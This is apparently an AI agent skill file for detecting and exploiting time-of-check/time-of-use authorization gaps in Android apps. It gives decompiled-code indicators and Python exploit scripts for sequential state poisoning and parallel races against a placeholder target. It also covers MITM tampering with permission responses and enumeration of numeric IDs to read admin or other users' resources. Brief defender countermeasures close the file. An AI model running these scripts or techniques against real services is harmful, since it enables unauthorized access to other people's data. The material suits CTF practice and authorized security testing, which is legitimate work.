---
name: android-toctou-check-permission-bypass
description: Use when an Android app splits authorization into a check-permission request and a separate resource-read request with a delay between them (TOCTOU). Covers sequential poisoning, parallel race, and MITM response tampering to access another user's resources. Triggers - "toctou android", "race condition permission", "check-permission bypass", "broken access control mobile", "CWE-367"
platform: [android]
stack: [native]
category: auth
tier: B
related: []
---

# Skill: Android TOCTOU check-permission bypass

## Context

Mobile apps that implement access control in **two separate requests**:
1. `GET /resource/:id/check-permission` (time-of-check)
2. `GET /resource/:id` (time-of-use)

with a delay between them (`Thread.sleep`, async callback, etc.).

## Detection

### Indicators in the APK (jadx/apktool)

1. **`check-permission` endpoint or similar** (`/api/resource/:id/permission`, `/can-access`, `/verify-access`)
2. **Two separate HTTP requests** for a single action (check + read)
3. **Delay between requests** (`Thread.sleep(100)`, `Handler.postDelayed`, async callback)
4. **Trust-all SSL** (empty TrustManager, HostnameVerifier `return true`): makes MITM easier to observe the flow
5. **HTTP cleartext** (`usesCleartextTraffic="true"`): allows sniffing

### Code pattern (decompiled Java)

```java
// Request 1: check-permission
String url = baseUrl + "/notes/" + id + "/check-permission";
httpClient.newCall(buildGetRequest(url, token)).enqueue(callback);

// Callback after check-permission
public void onPermissionGranted() {
    Thread.sleep(100);  // <-- DELAY = TOCTOU hint
    // Request 2: read
    String url2 = baseUrl + "/notes/" + id;
    httpClient.newCall(buildGetRequest(url2, token)).enqueue(readCallback);
}
```

## Exploitation

### Prerequisites

- A valid account (register/login) with a JWT token
- Your own resource (note, file, etc.) to make a legitimate `check-permission` call
- The target (admin/restricted) resource ID: usually numeric (`1`, `2`)

### Vector 1: Sequential TOCTOU (server with global state)

If the server stores the `check-permission` result in a **global** variable (not per-request/session):

```python
import requests

base = 'http://TARGET:PORT/api'
s = requests.Session()
h = {'Authorization': f'Bearer {token}'}
own_id = get_own_resource_id()

for _ in range(50):
    s.get(f'{base}/resource/{own_id}/check-permission', headers=h)  # poison global
    r = s.get(f'{base}/resource/1', headers=h)                      # bypass read
    if r.status_code == 200:
        print(r.json())  # flag
        break
```

### Vector 2: Parallel race (last-byte sync)

If the server evaluates the check and the read in parallel:

```python
import concurrent.futures

with concurrent.futures.ThreadPoolExecutor(2) as pool:
    f1 = pool.submit(s.get, f'{base}/resource/{own_id}/check-permission', headers=h)
    f2 = pool.submit(s.get, f'{base}/resource/1', headers=h)
    r = f2.result()
```

### Vector 3: MITM (if trust-all SSL)

If the app trusts any certificate, intercept the `check-permission` response and change `success: false` → `success: true`, or intercept the `GET /notes/:id` and change the ID in flight.

## Numeric vs string IDs

- **Try numeric IDs first:** `1`, `2`, `3` (admin notes usually have low IDs)
- **The string `flag` is a rabbit hole**: if it does not exist, it returns 404 even after the bypass
- **Enumerate:** after the bypass, iterate IDs `1..100` to map resources

## Variations

| Variant | Detection | Exploitation |
|----------|-----------|-------------|
| Global `allowed` flag | Sequential check+read works | Vector 1 (sequential) |
| Session-scoped `allowed` | Only works with the same session cookie | Use the same Session |
| Per-request `allowed` | Never works | Not TOCTOU |
| Real race (not global) | Only parallel works | Vector 2 (threads) |

## Countermeasures (for the defender)

1. **Bind authorization to the request:** validate ownership in `GET /resource/:id`, do not split check/use
2. **Use per-request/session state,** not global variables
3. **Validate ownership on every request** that accesses a resource
4. **Do not use `Thread.sleep` between check and read**: it widens the race window

## References

- OWASP A01:2021: Broken Access Control
- OWASP Mobile Top 10: M1: Improper Platform Usage
- TOCTOU: Time-of-Check to Time-of-Use (CWE-367)
